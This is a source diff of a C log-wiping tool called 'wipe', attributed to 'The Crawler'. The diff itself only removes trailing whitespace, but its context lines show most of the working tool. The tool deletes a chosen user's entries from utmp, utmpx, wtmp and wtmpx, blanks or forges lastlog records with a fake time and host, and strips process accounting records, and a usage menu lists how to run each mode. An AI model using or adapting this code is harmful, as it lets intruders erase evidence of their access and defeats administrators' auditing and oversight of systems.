@@ -4,7 +4,7 @@
  * Written by The Crawler.
  *
  * Selectively wipe system logs.
- * 
+ *
  * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
  *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
  */
@@ -39,7 +39,7 @@
 #endif
 
 /*
- * Try to use the paths out of the include files. 
+ * Try to use the paths out of the include files.
  * But if we can't find any, revert to the defaults.
  */
 #ifndef UTMP_FILE
@@ -48,7 +48,7 @@
 #else
 #define UTMP_FILE	"/var/adm/utmp"
 #endif
-#endif 
+#endif
 
 #ifndef WTMP_FILE
 #ifdef _PATH_WTMP
@@ -85,7 +85,7 @@
 #define BUFFSIZE	8192
 
 
-/* 
+/*
  * This function will copy the src file to the dst file.
  */
 void
@@ -104,13 +104,13 @@ copy_file(char *src, char *dst)
 		fprintf(stderr, "ERROR: Creating %s during copy.\n", dst);
 		return;
 	}
-	
+
 	while ( (n = read(fd1, buf, BUFFSIZE)) > 0)
 		if (write(fd2, buf, n) != n) {
 			fprintf(stderr, "ERROR: Write error during copy.\n");
 			return;
 		}
-		
+
 	if (n < 0) {
 		fprintf(stderr, "ERROR: Read error during copy.\n");
 		return;
@@ -129,7 +129,7 @@ wipe_utmp(char *who, char *line)
 {
 	int 		fd1;
 	struct utmp	ut;
-	
+
 	printf("Patching %s .... ", UTMP_FILE);
 	fflush(stdout);
 
@@ -140,13 +140,13 @@ wipe_utmp(char *who, char *line)
 		fprintf(stderr, "ERROR: Opening %s\n", UTMP_FILE);
 		return;
 	}
-	
+
 	/*
-	 * Copy utmp file excluding relevent entries. 
-	 */	
-	while ( read(fd1, &ut, sizeof(ut)) > 0) 
+	 * Copy utmp file excluding relevent entries.
+	 */
+	while ( read(fd1, &ut, sizeof(ut)) > 0)
 		if ( !strncmp(ut.ut_name, who, strlen(who)) )
-			if (!line || (line && 
+			if (!line || (line &&
 			  !strncmp(ut.ut_line, line, strlen(line)))) {
 				bzero((char *) &ut, sizeof(ut));
 				lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
@@ -170,7 +170,7 @@ wipe_utmpx(char *who, char *line)
 
 	printf("Patching %s .... ", UTMPX_FILE);
 	fflush(stdout);
-		
+
 	/*
 	 * Open the utmp file and temporary file.
 	 */
@@ -179,9 +179,9 @@ wipe_utmpx(char *who, char *line)
 		return;
 	}
 
-	while ( (read(fd1, &utx, sizeof(utx)) ) > 0) 
+	while ( (read(fd1, &utx, sizeof(utx)) ) > 0)
 		if ( !strncmp(utx.ut_name, who, strlen(who)) )
-			if (!line || (line && 
+			if (!line || (line &&
 			  !strncmp(utx.ut_line, line, strlen(line)))) {
 				bzero((char *) &utx, sizeof(utx));
 				lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
@@ -206,7 +206,7 @@ wipe_wtmp(char *who, char *line)
 
 	printf("Patching %s .... ", WTMP_FILE);
 	fflush(stdout);
-	
+
 	/*
 	 * Open the wtmp file and temporary file.
 	 */
@@ -221,7 +221,7 @@ wipe_wtmp(char *who, char *line)
 	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
 	while ( (read (fd1, &ut, sizeof(ut))) > 0) {
 		if (!strncmp(ut.ut_name, who, strlen(who)))
-			if (!line || (line && 
+			if (!line || (line &&
 			  !strncmp(ut.ut_line, line, strlen(line)))) {
 			  	bzero((char *) &ut, sizeof(ut));
 				lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
@@ -232,7 +232,7 @@ wipe_wtmp(char *who, char *line)
 	}
 
 	close(fd1);
-	
+
 	printf("Done.\n");
 }
 
@@ -246,10 +246,10 @@ wipe_wtmpx(char *who, char *line)
 {
 	int 		fd1;
 	struct utmpx	utx;
-	
+
 	printf("Patching %s .... ", WTMPX_FILE);
 	fflush(stdout);
-	
+
 	/*
 	 * Open the utmp file and temporary file.
 	 */
@@ -264,7 +264,7 @@ wipe_wtmpx(char *who, char *line)
 	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
 	while ( (read (fd1, &utx, sizeof(utx))) > 0) {
 		if (!strncmp(utx.ut_name, who, strlen(who)))
-			if (!line || (line && 
+			if (!line || (line &&
 			  !strncmp(utx.ut_line, line, strlen(line)))) {
 			  	bzero((char *) &utx, sizeof(utx));
 				lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
@@ -295,7 +295,7 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 
 	printf("Patching %s .... ", LASTLOG_FILE);
 	fflush(stdout);
-	
+
         /*
 	 * Open the lastlog file.
 	 */
@@ -308,11 +308,11 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 		fprintf(stderr, "ERROR: Can't find user in passwd.\n");
 		return;
 	}
-	
+
 	lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0);
 	bzero((char *) &ll, sizeof(ll));
 
-	if (line) 
+	if (line)
 		strncpy(ll.ll_line, line, strlen(line));
 
 	if (timestr) {
@@ -321,7 +321,7 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 			fprintf(stderr, "ERROR: Time format is YYYYMMddhhmm.\n");
 			return;
 		}
-		
+
 		/*
 		 * Extract Times.
 		 */
@@ -331,20 +331,20 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 		str[3] = timestr[3];
 		str[4] = 0;
 		tm.tm_year = atoi(str)-1900;
-		
+
 		str[0] = timestr[4];
 		str[1] = timestr[5];
 		str[2] = 0;
 		tm.tm_mon = atoi(str)-1;
-		
+
 		str[0] = timestr[6];
 		str[1] = timestr[7];
 		tm.tm_mday = atoi(str);
-		
+
 		str[0] = timestr[8];
 		str[1] = timestr[9];
 		tm.tm_hour = atoi(str);
-		
+
 		str[0] = timestr[10];
 		str[1] = timestr[11];
 		tm.tm_min = atoi(str);
@@ -355,7 +355,7 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
 
 	if (host)
 		strncpy(ll.ll_host, host, sizeof(ll.ll_host));
-	
+
 	write(fd1, (char *) &ll, sizeof(ll));
 
 	close(fd1);
@@ -377,7 +377,7 @@ wipe_acct(char *who, char *line)
 	struct passwd   *pwd;
 	struct stat	sbuf;
 	char		*tmpf = "/tmp/acct_XXXXXX";
-	
+
 	printf("Patching %s ... ", ACCT_FILE);
 	fflush(stdout);
 
@@ -411,24 +411,24 @@ wipe_acct(char *who, char *line)
 		fprintf(stderr, "ERROR: Determining tty device number.\n");
 		return;
 	}
-	
+
 	while ( read(fd1, &ac, sizeof(ac)) > 0 ) {
-		if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )	
+		if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )
 			write(fd2, &ac, sizeof(ac));
 	}
 
 	close(fd1);
 	close(fd2);
-	
+
 	copy_file(tmpf, ACCT_FILE);
-	
+
 	if ( unlink(tmpf) < 0 ) {
 		fprintf(stderr, "ERROR: Unlinking tmp WTMP file.\n");
 		return;
 	}
 
 	printf("Done.\n");
-} 
+}
 #endif
 
 
@@ -448,7 +448,7 @@ usage()
 	printf("WTMP editing (%s)\n", WTMP_FILE);
 	printf("   Erase last entry for user :   wipe w [username]\n");
 	printf("   Erase last entry on tty   :   wipe w [username] [tty]\n");
-	printf("\n");	
+	printf("\n");
 	printf("LASTLOG editing (%s)\n", LASTLOG_FILE);
 	printf("   Blank lastlog for user    :   wipe l [username]\n");
 	printf("   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\n");
@@ -466,7 +466,7 @@ int
 main(int argc, char *argv[])
 {
 	char	c;
-	
+
 	if (argc < 3)
 		usage();
 
@@ -474,7 +474,7 @@ main(int argc, char *argv[])
 	 * First character of first argument determines which file to edit.
 	 */
 	c = toupper(argv[1][0]);
-	
+
 	/*
 	 * UTMP editing.
 	 */
@@ -485,14 +485,14 @@ main(int argc, char *argv[])
 				wipe_utmp(argv[2], (char *) NULL);
 			if (argc ==4)
 				wipe_utmp(argv[2], argv[3]);
-			
+
 #ifdef HAVE_UTMPX
 			if (argc == 3)
 				wipe_utmpx(argv[2], (char *) NULL);
 			if (argc == 4)
 				wipe_utmpx(argv[2], argv[3]);
 #endif
-			
+
 			break;
 		/* WTMP */
 		case 'W' :
@@ -500,28 +500,28 @@ main(int argc, char *argv[])
 				wipe_wtmp(argv[2], (char *) NULL);
 			if (argc == 4)
 				wipe_wtmp(argv[2], argv[3]);
-			
+
 #ifdef HAVE_UTMPX
 			if (argc == 3)
 				wipe_wtmpx(argv[2], (char *) NULL);
 			if (argc == 4)
 				wipe_wtmpx(argv[2], argv[3]);
 #endif
-			
+
 			break;
 		/* LASTLOG */
 		case 'L' :
 			if (argc == 3)
-				wipe_lastlog(argv[2], (char *) NULL, 
+				wipe_lastlog(argv[2], (char *) NULL,
 					(char *) NULL, (char *) NULL);
 			if (argc == 4)
 				wipe_lastlog(argv[2], argv[3], (char *) NULL,
 						(char *) NULL);
 			if (argc == 5)
-				wipe_lastlog(argv[2], argv[3], argv[4], 
+				wipe_lastlog(argv[2], argv[3], argv[4],
 						(char *) NULL);
 			if (argc == 6)
-				wipe_lastlog(argv[2], argv[3], argv[4], 
+				wipe_lastlog(argv[2], argv[3], argv[4],
 						argv[5]);
 			break;
 #ifndef NO_ACCT
